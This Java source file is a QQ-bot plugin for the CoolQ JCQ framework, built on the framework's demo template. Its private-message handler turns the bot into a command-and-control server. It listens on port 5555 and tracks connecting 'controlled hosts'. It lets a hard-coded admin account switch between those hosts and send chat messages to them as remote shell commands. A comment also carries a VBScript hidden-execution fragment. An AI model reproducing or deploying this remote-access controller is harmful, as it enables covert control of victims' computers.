package com.example;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import javax.swing.JOptionPane;

import com.sobte.cqp.jcq.entity.Anonymous;
import com.sobte.cqp.jcq.entity.CQDebug;
import com.sobte.cqp.jcq.entity.GroupFile;
import com.sobte.cqp.jcq.entity.ICQVer;
import com.sobte.cqp.jcq.entity.IMsg;
import com.sobte.cqp.jcq.entity.IRequest;
import com.sobte.cqp.jcq.event.JcqAppAbstract;

/**
 * 本文件是JCQ插件的主类<br>
 * <br>
 * 
 * 注意修改json中的class来加载主类，如不设置则利用appid加载，最后一个单词自动大写查找<br>
 * 例：appid(com.example.demo) 则加载类 com.example.Demo<br>
 * 文档地址： https://gitee.com/Sobte/JCQ-CoolQ <br>
 * 帖子：https://cqp.cc/t/37318 <br>
 * 辅助开发变量: {@link JcqAppAbstract#CQ CQ}({@link com.sobte.cqp.jcq.entity.CoolQ 酷Q核心操作类}),
 * 			 {@link JcqAppAbstract#CC CC}({@link com.sobte.cqp.jcq.entity.CQCode 酷Q码操作类}),
 * 			   具体功能可以查看文档
 */
public class Demo extends JcqAppAbstract implements ICQVer, IMsg, IRequest {

	public static final long adminQQ = 2102084678;	//管理者的QQ号
	public static int start_flag = 0;	//服务端是否启动 1:是	-1:否
	public static ArrayList aClientQueue = new ArrayList();	//被控端队列
	public static int iClientId = 0;	//被控端id
	public static int iCurrentClientId = -1;	//当前被控端id
	public static final int PORT = 5555;	//端口
	public static clientInfo cCurrentClientInfo;	//当前操作的被控端信息
		
	/**
     * 用main方法调试可以最大化的加快开发效率，检测和定位错误位置<br/>
     * 以下就是使用Main方法进行测试的一个简易案例
     *
     * @param args 系统参数
     */
    public static void main(String[] args) {
        // CQ此变量为特殊变量，在JCQ启动时实例化赋值给每个插件，而在测试中可以用CQDebug类来代替他
        CQ = new CQDebug();//new CQDebug("应用目录","应用名称") 可以用此构造器初始化应用的目录
        CQ.logInfo("[JCQ] TEST Demo", "测试启动");// 现在就可以用CQ变量来执行任何想要的操作了
        // 要测试主类就先实例化一个主类对象
        Demo demo = new Demo();
        // 下面对主类进行各方法测试,按照JCQ运行过程，模拟实际情况
        demo.startup();// 程序运行开始 调用应用初始化方法
        demo.enable();// 程序初始化完成后，启用应用，让应用正常工作
        // 开始模拟发送消息
        // 模拟私聊消息
        // 开始模拟QQ用户发送消息，以下QQ全部编造，请勿添加
        demo.privateMsg(0, 10001, 2234567819L, "小姐姐约吗", 0);
        demo.privateMsg(0, 10002, 2222222224L, "喵呜喵呜喵呜", 0);
        demo.privateMsg(0, 10003, 2111111334L, "可以给我你的微信吗", 0);
        demo.privateMsg(0, 10004, 3111111114L, "今天天气真好", 0);
        demo.privateMsg(0, 10005, 3333333334L, "你好坏，都不理我QAQ", 0);
        // 模拟群聊消息
        // 开始模拟群聊消息
        demo.groupMsg(0, 10006, 3456789012L, 3333333334L, "", "菜单", 0);
        demo.groupMsg(0, 10008, 3456789012L, 11111111114L, "", "小喵呢，出来玩玩呀", 0);
        demo.groupMsg(0, 10009, 427984429L, 3333333334L, "", "[CQ:at,qq=2222222224] 来一起玩游戏，开车开车", 0);
        demo.groupMsg(0, 10010, 427984429L, 3333333334L, "", "好久不见啦 [CQ:at,qq=11111111114]", 0);
        demo.groupMsg(0, 10011, 427984429L, 11111111114L, "", "qwq 有没有一起开的\n[CQ:at,qq=3333333334]你玩嘛", 0);
        // ......
        // 依次类推，可以根据实际情况修改参数，和方法测试效果
        // 以下是收尾触发函数
        // demo.disable();// 实际过程中程序结束不会触发disable，只有用户关闭了此插件才会触发
        demo.exit();// 最后程序运行结束，调用exit方法
    }

    /**
     * 打包后将不会调用 请不要在此事件中写其他代码
     *
     * @return 返回应用的ApiVer、Appid
     */
    public String appInfo() {
        // 应用AppID,规则见 http://d.cqp.me/Pro/开发/基础信息#appid
        String AppID = "com.example.demo";// 记住编译后的文件和json也要使用appid做文件名
        /**
         * 本函数【禁止】处理其他任何代码，以免发生异常情况。
         * 如需执行初始化代码请在 startup 事件中执行（Type=1001）。
         */
        return CQAPIVER + "," + AppID;
    }

    /**
     * 酷Q启动 (Type=1001)<br>
     * 本方法会在酷Q【主线程】中被调用。<br>
     * 请在这里执行插件初始化代码。<br>
     * 请务必尽快返回本子程序，否则会卡住其他插件以及主程序的加载。
     *
     * @return 请固定返回0
     */
    public int startup() {
        // 获取应用数据目录(无需储存数据时，请将此行注释)
        String appDirectory = CQ.getAppDirectory();
        // 返回如：D:\CoolQ\app\com.sobte.cqp.jcq\app\com.example.demo\
        // 应用的所有数据、配置【必须】存放于此目录，避免给用户带来困扰。
        
        CQ.sendPrivateMsg(adminQQ, "酷Q启动了");
        return 0;
    }

    /**
     * 酷Q退出 (Type=1002)<br>
     * 本方法会在酷Q【主线程】中被调用。<br>
     * 无论本应用是否被启用，本函数都会在酷Q退出前执行一次，请在这里执行插件关闭代码。
     *
     * @return 请固定返回0，返回后酷Q将很快关闭，请不要再通过线程等方式执行其他代码。
     */
    public int exit() {
    	CQ.sendPrivateMsg(adminQQ, "酷Q退出了");
        return 0;
    }

    /**
     * 应用已被启用 (Type=1003)<br>
     * 当应用被启用后，将收到此事件。<br>
     * 如果酷Q载入时应用已被启用，则在 {@link #startup startup}(Type=1001,酷Q启动) 被调用后，本函数也将被调用一次。<br>
     * 如非必要，不建议在这里加载窗口。
     *
     * @return 请固定返回0。
     */
    public int enable() {
        enable = true;
        return 0;
    }

    /**
     * 应用将被停用 (Type=1004)<br>
     * 当应用被停用前，将收到此事件。<br>
     * 如果酷Q载入时应用已被停用，则本函数【不会】被调用。<br>
     * 无论本应用是否被启用，酷Q关闭前本函数都【不会】被调用。
     *
     * @return 请固定返回0。
     */
    public int disable() {
        enable = false;
        return 0;
    }

    /**
     * 私聊消息 (Type=21)<br>
     * 本方法会在酷Q【线程】中被调用。<br>
     *
     * @param subType 子类型，11/来自好友 1/来自在线状态 2/来自群 3/来自讨论组
     * @param msgId   消息ID
     * @param fromQQ  来源QQ
     * @param msg     消息内容
     * @param font    字体
     * @return 返回值*不能*直接返回文本 如果要回复消息，请调用api发送<br>
     * 这里 返回  {@link IMsg#MSG_INTERCEPT MSG_INTERCEPT} - 截断本条消息，不再继续处理<br>
     * 注意：应用优先级设置为"最高"(10000)时，不得使用本返回值<br>
     * 如果不回复消息，交由之后的应用/过滤器处理，这里 返回  {@link IMsg#MSG_IGNORE MSG_IGNORE} - 忽略本条消息
     */
    public int privateMsg(int subType, int msgId, long fromQQ, String msg, int font) {
        // 这里处理消息
        //CQ.sendPrivateMsg(fromQQ, "你发送了这样的消息：" + msg + "\n来自Java插件");
        if(subType == 11 && fromQQ == adminQQ) //判断来自好友消息 并且是来自管理员的QQ账号
        {
        	if(msg.equals("startx"))
        	{
        		Demo.CQ.logInfo("Menu", "startx");
        		if(start_flag != 0)
        		{
        			CQ.sendPrivateMsg(fromQQ, "服务端已经开启");
        			return MSG_IGNORE;
        		}
        		start_flag = 1;	//列表状态
        		CQ.sendPrivateMsg(fromQQ, "当前管理员: " + adminQQ + "\n"
        				+ "服务端正在启动...\n"
        				+"ls: 列出所有上线主机\n"
        				+ "cd: 切换到id对应主机 ch [hostId]");
        		try {	//必须把接受线程放在这里 否则接收线程就会退出
        			ServerSocket server = new ServerSocket(Demo.PORT);
        			Demo.CQ.sendPrivateMsg(Demo.adminQQ, "开始监听端口");
        			while(true)
        			{
        				Socket s1 = server.accept();
        				clientInfo c1= new clientInfo(Demo.iClientId++,s1);
        				Demo.aClientQueue.add(c1);	//创建一个对象 并且添加到队列里面
        				Demo.CQ.sendPrivateMsg(Demo.adminQQ, "新客户端上线"+s1.getInetAddress()+":"+s1.getPort());	//通知管理员
        				new Thread(new clientThread(c1)).start();
        				
        			}
        			
        		} catch (IOException e) {
        			// TODO 自动生成的 catch 块
        			e.printStackTrace();
        		}
        	    
        	}else if(msg.equals("ls"))
        	{
        		Demo.CQ.logInfo("Menu", "ls");
        		if(start_flag == 1)	//处于列表状态
        		{
	        		StringBuilder sb = new StringBuilder();
	        		sb.append("以下客户端在线:\n");
	        		for(int i = 0;i<aClientQueue.size();i++)
	        		{
	        			clientInfo u1 = (clientInfo)aClientQueue.get(i);
	        			sb.append(u1.id+": "+u1.s.getInetAddress()+":"+u1.s.getPort()+"\n");
	        		}
	        		CQ.sendPrivateMsg(adminQQ, sb.toString());
        		}else
        		{
        			CQ.sendPrivateMsg(adminQQ, "请先通过EC退出[id="+iCurrentClientId+"]的控制状态");
        		}
        	}else if(msg.toCharArray()[0] == 'c' && msg.toCharArray()[1] == 'h')	//如果是ch命令 切换被控端
        	{
        		Demo.CQ.logInfo("Menu", "cd");
        		try 
        		{
	        		iCurrentClientId = Integer.parseInt(msg.substring(3));
	        		for(int i= 0 ;i < aClientQueue.size();i++)
	        		{
	        			clientInfo u1 = (clientInfo)aClientQueue.get(i);
	        			if(u1.id == iCurrentClientId)	//判断队列里面有没有想要切换的被控端
	        			{
	        				CQ.sendPrivateMsg(adminQQ, "成功切换控制到 [id="+iCurrentClientId+"]\n允许以下命令:\n"
	        						+ "shell: 反弹被控端的shell\n"
	        						+ "EC: 退出被控端的控制状态");
	        				start_flag = 2;
	        				cCurrentClientInfo = u1;	//更新当前操作被控端信息
	        				return MSG_IGNORE;
	        			}
	        		}
	        		CQ.sendPrivateMsg(adminQQ, "不存在的被控端" + Integer.parseInt(msg.substring(3)));	//队列里面没有想要切换的被控端
	        		start_flag = 1;
        		}catch(Exception e)
        		{
        			CQ.logInfo("ch", e.toString());
        		}
        	}else if(msg.equals("shell"))
        	{
        		Demo.CQ.logInfo("Menu", "shell");
        		if(start_flag == 2)	//已经切换到某个被控端了
        		{
					try {
						CQ.sendPrivateMsg(adminQQ, "切换到[id="+iCurrentClientId+"] 的shell状态");
	        			OutputStream os;
						os = cCurrentClientInfo.s.getOutputStream();
						os.write("shell".getBytes("GBK"));	//发送"shell"使客户端进入接受shell命令的状态
						os.flush();
						start_flag = 3;	//shell状态
						return MSG_IGNORE;
					} catch (IOException e) {
						// TODO 自动生成的 catch 块
						e.printStackTrace();
					}
        		}else
        		{
        			CQ.sendPrivateMsg(adminQQ, "切换到被控端状态才可用shell命令");
        		}
        		
        	}else if(msg.equals("EC"))
        	{
        		Demo.CQ.logInfo("Menu", "EC");
        		if(start_flag == 2)
        		{
        			CQ.sendPrivateMsg(adminQQ, "退出 [id="+iCurrentClientId+"] 的控制状态");
        			start_flag = 1;	//列表状态
        		}else
        		{
        			CQ.sendPrivateMsg(adminQQ, "现在不是控制状态,不能退出控制状态");
        		}
        	}else if(msg.equals("SE"))
        	{
        		Demo.CQ.logInfo("Menu", "SE");
        		if(start_flag == 2 || start_flag == 3)
        		{
        			CQ.sendPrivateMsg(adminQQ, "退出 [id="+iCurrentClientId+"] 的控制状态");
        			start_flag = 1;	//列表状态
        		}else
        		{
        			CQ.sendPrivateMsg(adminQQ, "现在不是控制状态,不能退出控制状态");
        		}
        	}else
        	{
        		CQ.logInfo("Menu", "shell状态");
        		if(start_flag == 3)	//shell状态 接受shell命令
        		{
        			CQ.logInfo("Shell", "进入shell状态");
        			try {
						//InputStream read = cCurrentClientInfo.s.getInputStream();
						OutputStream os = cCurrentClientInfo.s.getOutputStream();
						
						CQ.logInfo("Shell", "Shell发送之前");
						if(msg.equals("ES"))
						{
							CQ.sendPrivateMsg(adminQQ, "退出"+iCurrentClientId+"shell状态,现在是控制状态");
		        			start_flag = 2;
						}
						os.write(msg.getBytes("GBK"));	//发送shell命令
						os.flush();
						CQ.logInfo("Shell命令内容", msg);	
						
						return MSG_IGNORE;
						//byte str[] = new byte[1024*10];
					    //read.read(str);
						//CQ.sendPrivateMsg(adminQQ, new String(str,"GBK"));
					} catch (IOException e) {
						// TODO 自动生成的 catch 块
						CQ.logInfo("shell异常", e.toString());
						e.printStackTrace();
					}
        		}
        	}
        	CQ.logInfo("shell", "状态: " + start_flag);
        }
    	
    	return MSG_IGNORE;
    }
    


    
    
    /**
     * 群消息 (Type=2)<br>
     * 本方法会在酷Q【线程】中被调用。<br>
     *
     * @param subType       子类型，目前固定为1
     * @param msgId         消息ID
     * @param fromGroup     来源群号
     * @param fromQQ        来源QQ号
     * @param fromAnonymous 来源匿名者
     * @param msg           消息内容		createobject ("wscript.shell").run "",0
     * @param font          字体
     * @return 关于返回值说明, 见 {@link #privateMsg 私聊消息} 的方法
     */
    public int groupMsg(int subType, int msgId, long fromGroup, long fromQQ, String fromAnonymous, String msg,
                        int font) {
        // 如果消息来自匿名者
        if (fromQQ == 80000000L && !fromAnonymous.equals("")) {
            // 将匿名用户信息放到 anonymous 变量中
            Anonymous anonymous = CQ.getAnonymous(fromAnonymous);
        }

        // 解析CQ码案例 如：[CQ:at,qq=100000]
        // 解析CQ码 常用变量为 CC(CQCode) 此变量专为CQ码这种特定格式做了解析和封装
        // CC.analysis();// 此方法将CQ码解析为可直接读取的对象
        // 解析消息中的QQID
        //long qqId = CC.getAt(msg);// 此方法为简便方法，获取第一个CQ:at里的QQ号，错误时为：-1000
        //List<Long> qqIds = CC.getAts(msg); // 此方法为获取消息中所有的CQ码对象，错误时返回 已解析的数据
        // 解析消息中的图片
        //CQImage image = CC.getCQImage(msg);// 此方法为简便方法，获取第一个CQ:image里的图片数据，错误时打印异常到控制台，返回 null
        //List<CQImage> images = CC.getCQImages(msg);// 此方法为获取消息中所有的CQ图片数据，错误时打印异常到控制台，返回 已解析的数据

        // 这里处理消息
        //CQ.sendGroupMsg(fromGroup, CC.at(fromQQ) + "你发送了这样的消息：" + msg + "\n来自Java插件");
        return MSG_IGNORE;
    }

    /**
     * 讨论组消息 (Type=4)<br>
     * 本方法会在酷Q【线程】中被调用。<br>
     *
     * @param subtype     子类型，目前固定为1
     * @param msgId       消息ID
     * @param fromDiscuss 来源讨论组
     * @param fromQQ      来源QQ号
     * @param msg         消息内容
     * @param font        字体
     * @return 关于返回值说明, 见 {@link #privateMsg 私聊消息} 的方法
     */
    public int discussMsg(int subtype, int msgId, long fromDiscuss, long fromQQ, String msg, int font) {
        // 这里处理消息

        return MSG_IGNORE;
    }

    /**
     * 群文件上传事件 (Type=11)<br>
     * 本方法会在酷Q【线程】中被调用。<br>
     *
     * @param subType   子类型，目前固定为1
     * @param sendTime  发送时间(时间戳)// 10位时间戳
     * @param fromGroup 来源群号
     * @param fromQQ    来源QQ号
     * @param file      上传文件信息
     * @return 关于返回值说明, 见 {@link #privateMsg 私聊消息} 的方法
     */
    public int groupUpload(int subType, int sendTime, long fromGroup, long fromQQ, String file) {
        GroupFile groupFile = CQ.getGroupFile(file);
        if (groupFile == null) { // 解析群文件信息，如果失败直接忽略该消息
            return MSG_IGNORE;
        }
        // 这里处理消息
        return MSG_IGNORE;
    }

    /**
     * 群事件-管理员变动 (Type=101)<br>
     * 本方法会在酷Q【线程】中被调用。<br>
     *
     * @param subtype        子类型，1/被取消管理员 2/被设置管理员
     * @param sendTime       发送时间(时间戳)
     * @param fromGroup      来源群号
     * @param beingOperateQQ 被操作QQ
     * @return 关于返回值说明, 见 {@link #privateMsg 私聊消息} 的方法
     */
    public int groupAdmin(int subtype, int sendTime, long fromGroup, long beingOperateQQ) {
        // 这里处理消息

        return MSG_IGNORE;
    }

    /**
     * 群事件-群成员减少 (Type=102)<br>
     * 本方法会在酷Q【线程】中被调用。<br>
     *
     * @param subtype        子类型，1/群员离开 2/群员被踢
     * @param sendTime       发送时间(时间戳)
     * @param fromGroup      来源群号
     * @param fromQQ         操作者QQ(仅子类型为2时存在)
     * @param beingOperateQQ 被操作QQ
     * @return 关于返回值说明, 见 {@link #privateMsg 私聊消息} 的方法
     */
    public int groupMemberDecrease(int subtype, int sendTime, long fromGroup, long fromQQ, long beingOperateQQ) {
        // 这里处理消息

        return MSG_IGNORE;
    }

    /**
     * 群事件-群成员增加 (Type=103)<br>
     * 本方法会在酷Q【线程】中被调用。<br>
     *
     * @param subtype        子类型，1/管理员已同意 2/管理员邀请
     * @param sendTime       发送时间(时间戳)
     * @param fromGroup      来源群号
     * @param fromQQ         操作者QQ(即管理员QQ)
     * @param beingOperateQQ 被操作QQ(即加群的QQ)
     * @return 关于返回值说明, 见 {@link #privateMsg 私聊消息} 的方法
     */
    public int groupMemberIncrease(int subtype, int sendTime, long fromGroup, long fromQQ, long beingOperateQQ) {
        // 这里处理消息

        return MSG_IGNORE;
    }

    /**
     * 好友事件-好友已添加 (Type=201)<br>
     * 本方法会在酷Q【线程】中被调用。<br>
     *
     * @param subtype  子类型，目前固定为1
     * @param sendTime 发送时间(时间戳)
     * @param fromQQ   来源QQ
     * @return 关于返回值说明, 见 {@link #privateMsg 私聊消息} 的方法
     */
    public int friendAdd(int subtype, int sendTime, long fromQQ) {
        // 这里处理消息

        return MSG_IGNORE;
    }

    /**
     * 请求-好友添加 (Type=301)<br>
     * 本方法会在酷Q【线程】中被调用。<br>
     *
     * @param subtype      子类型，目前固定为1
     * @param sendTime     发送时间(时间戳)
     * @param fromQQ       来源QQ
     * @param msg          附言
     * @param responseFlag 反馈标识(处理请求用)
     * @return 关于返回值说明, 见 {@link #privateMsg 私聊消息} 的方法
     */
    public int requestAddFriend(int subtype, int sendTime, long fromQQ, String msg, String responseFlag) {
        // 这里处理消息

        /**
         * REQUEST_ADOPT 通过
         * REQUEST_REFUSE 拒绝
         */

        // CQ.setFriendAddRequest(responseFlag, REQUEST_ADOPT, null); // 同意好友添加请求
        return MSG_IGNORE;
    }

    /**
     * 请求-群添加 (Type=302)<br>
     * 本方法会在酷Q【线程】中被调用。<br>
     *
     * @param subtype      子类型，1/他人申请入群 2/自己(即登录号)受邀入群
     * @param sendTime     发送时间(时间戳)
     * @param fromGroup    来源群号
     * @param fromQQ       来源QQ
     * @param msg          附言
     * @param responseFlag 反馈标识(处理请求用)
     * @return 关于返回值说明, 见 {@link #privateMsg 私聊消息} 的方法
     */
    public int requestAddGroup(int subtype, int sendTime, long fromGroup, long fromQQ, String msg,
                               String responseFlag) {
        // 这里处理消息

        /**
         * REQUEST_ADOPT 通过
         * REQUEST_REFUSE 拒绝
         * REQUEST_GROUP_ADD 群添加
         * REQUEST_GROUP_INVITE 群邀请
         */
		/*if(subtype == 1){ // 本号为群管理，判断是否为他人申请入群
			CQ.setGroupAddRequest(responseFlag, REQUEST_GROUP_ADD, REQUEST_ADOPT, null);// 同意入群
		}
		if(subtype == 2){
			CQ.setGroupAddRequest(responseFlag, REQUEST_GROUP_INVITE, REQUEST_ADOPT, null);// 同意进受邀群
		}*/

        return MSG_IGNORE;
    }

    /**
     * 本函数会在JCQ【线程】中被调用。
     *
     * @return 固定返回0
     */
    public int menuA() {
        JOptionPane.showMessageDialog(null, "这是测试菜单A，可以在这里加载窗口");
        return 0;
    }

    /**
     * 本函数会在酷Q【线程】中被调用。
     *
     * @return 固定返回0
     */
    public int menuB() {
        JOptionPane.showMessageDialog(null, "这是测试菜单B，可以在这里加载窗口");
        return 0;
    }

}
